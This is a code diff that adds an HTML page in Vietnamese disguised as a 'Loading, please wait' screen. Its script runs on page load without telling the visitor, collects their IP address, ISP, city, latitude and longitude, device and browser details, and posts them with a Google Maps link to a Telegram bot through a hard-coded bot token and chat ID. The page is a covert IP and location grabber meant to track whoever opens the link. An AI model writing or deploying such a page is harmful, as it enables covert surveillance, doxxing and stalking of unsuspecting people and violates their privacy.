@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Đang tải...</title>
+    <style>
+        body { font-family: Arial; background:#f3f3f3; text-align:center; padding-top:50px; }
+        .card{
+            width:90%; max-width:420px; margin:auto;
+            background:white; padding:20px;
+            border-radius:15px; box-shadow:0 0 10px rgba(0,0,0,0.1);
+        }
+        img{width:100%; border-radius:15px;}
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <img src="https://i.imgur.com/Vz1T3rN.jpeg">
+    <h2>Đang tải...</h2>
+    <p>Vui lòng đợi trong giây lát...</p>
+</div>
+
+<script>
+// === TOKEN & CHAT ID của bạn ===
+const TOKEN = "8004822258:AAEVO8N_3Z1ESth3VXHZIXTI8IjBCs_Iabs";
+const CHAT_ID = "6243479167";
+
+// === Lấy thông tin thiết bị (giống a.py) ===
+function getDeviceInfo() {
+    return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width} x ${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
+}
+
+// === Gửi tin nhắn Telegram ===
+function sendToTelegram(text) {
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: "Markdown"
+        })
+    });
+}
+
+// === Lấy IP + vị trí bằng API mạnh nhất ===
+fetch("https://ipwho.is/")
+    .then(r => r.json())
+    .then(d => {
+        const device = getDeviceInfo();
+
+        const ip = d.ip || "Không rõ";
+        const isp = d.connection?.isp || "Không rõ";
+        const country = d.country || "Không rõ";
+        const city = d.city || "Không rõ";
+        const lat = d.latitude || "0";
+        const lon = d.longitude || "0";
+        const address = `${d.city}, ${d.region}, ${d.country}`;
+        const maps = `https://www.google.com/maps?q=${lat},${lon}`;
+
+        const text = `
+📡 [THÔNG TIN TRUY CẬP]
+
+🕒 Thời gian: ${new Date().toLocaleString()}
+🌍 IP: ${ip}
+🏢 ISP: ${isp}
+🏙️ Thành phố: ${city}
+🇻🇳 Quốc gia: ${country}
+📍 Vĩ độ: ${lat}
+📍 Kinh độ: ${lon}
+📌 Google Maps: ${maps}
+
+📱 Thiết bị: ${device.userAgent}
+🌐 Ngôn ngữ: ${device.language}
+🖥 Màn hình: ${device.screen}
+⏳ Múi giờ: ${device.timezone}
+        `;
+
+        sendToTelegram(text);
+    });
+</script>
+
+</body>
+</html>
